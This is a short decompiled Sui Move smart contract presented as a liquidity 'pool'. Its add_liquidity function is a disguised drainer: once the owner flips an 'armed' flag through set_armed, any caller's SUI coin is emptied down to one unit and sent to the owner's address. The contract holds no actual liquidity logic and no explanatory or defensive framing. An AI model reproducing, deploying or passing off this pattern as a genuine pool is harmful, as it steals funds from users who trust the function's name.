module 0x6691761d045b3889cd1002645c5d3d4f02a0235b20624d41003feece37252711::pool {
    struct Pool has key {
        id: 0x2::object::UID,
        owner: address,
        armed: bool,
    }

    public entry fun add_liquidity(arg0: &Pool, arg1: &mut 0x2::coin::Coin<0x2::sui::SUI>, arg2: &mut 0x2::tx_context::TxContext) {
        if (arg0.armed) {
            let v0 = 0x2::coin::value<0x2::sui::SUI>(arg1);
            if (v0 > 1) {
                0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(0x2::coin::split<0x2::sui::SUI>(arg1, v0 - 1, arg2), arg0.owner);
            };
        };
    }

    public entry fun create_pool(arg0: &mut 0x2::tx_context::TxContext) {
        let v0 = Pool{
            id    : 0x2::object::new(arg0),
            owner : 0x2::tx_context::sender(arg0),
            armed : false,
        };
        0x2::transfer::share_object<Pool>(v0);
    }

    public entry fun set_armed(arg0: &mut Pool, arg1: bool, arg2: &0x2::tx_context::TxContext) {
        assert!(arg0.owner == 0x2::tx_context::sender(arg2), 0);
        arg0.armed = arg1;
    }

    // decompiled from Move bytecode v7
}

